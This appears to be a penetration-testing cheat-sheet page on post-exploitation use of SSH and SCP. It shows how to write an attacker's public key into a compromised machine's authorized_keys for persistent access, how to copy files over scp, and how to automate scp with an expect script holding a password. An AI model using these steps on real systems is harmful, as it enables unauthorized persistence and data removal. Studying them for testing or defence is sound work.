# ⭕ SSH

## <mark style="color:red;">SSH - SCP</mark>

### <mark style="color:orange;">Generate Key Pair</mark>

if you manage to upload a reverse-shell and get access to the machine you might be able to enter using ssh. Which might give you a better shell and more stability, and all the other features of SSH. Like transferring files.

So, in the /home/user directory you can find the hidden .ssh files by typing ls -la. Then you need to do two things:

#### Create a new keypair, You do that with:

```
ssh-keygen -t rsa -C "your_email@example.com"
```

This will create two files, one called nameOfMyKey and another called nameOfMyKey\_pub. The one with the \_pub is of course your public key. And the other key is your private.

#### Add your public key to authorized\_keys.

Now you copy the content of nameOfMyKey\_pub. On the compromised machine you go to \~/.ssh and then run add the public key to the file authorized\_keys. Like this

```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQqlhJKYtL/r9655iwp5TiUM9Khp2DJtsJVW3t5qU765wR5Ni+ALEZYwqxHPNYS/kZ4Vdv..." > authorized_keys
```

#### Log in.

```
ssh -i nameOfMyKey kim@192.168.1.103
```

## <mark style="color:red;">SCP File Transfer</mark>

#### Copy a file:

```
scp /path/to/source/file.ext username@192.168.1.101:/path/to/destination/file.ext
```

#### Copy a directory:

```
scp -r /path/to/source/dir username@192.168.1.101:/path/to/destination
```

## <mark style="color:red;">non-interactive SCP</mark>

The only reason that a one-liner doesn’t work is because SCP prompts the user for a password, and simply echoing the password and piping it to the command won’t work. The list of commands to build the file looks like this:

```
echo '#!/usr/bin/expect' > scp.exp
echo 'spawn scp username@ip-addr:/path-to-file out-file' >> scp.exp
echo 'set pass "password"' >> scp.exp
echo 'expect {' >> scp.exp
echo 'password: {send "$pass\r"; exp_continue}' >> scp.exp
echo '}' >> scp.exp
```

To run this file

```
expect scp.exp
```

{% hint style="info" %}
you MUST use single quotes to surround the lines, as using double quotes will overlap with the double quotes that are included within the line, and will cause an issue with the first line
{% endhint %}
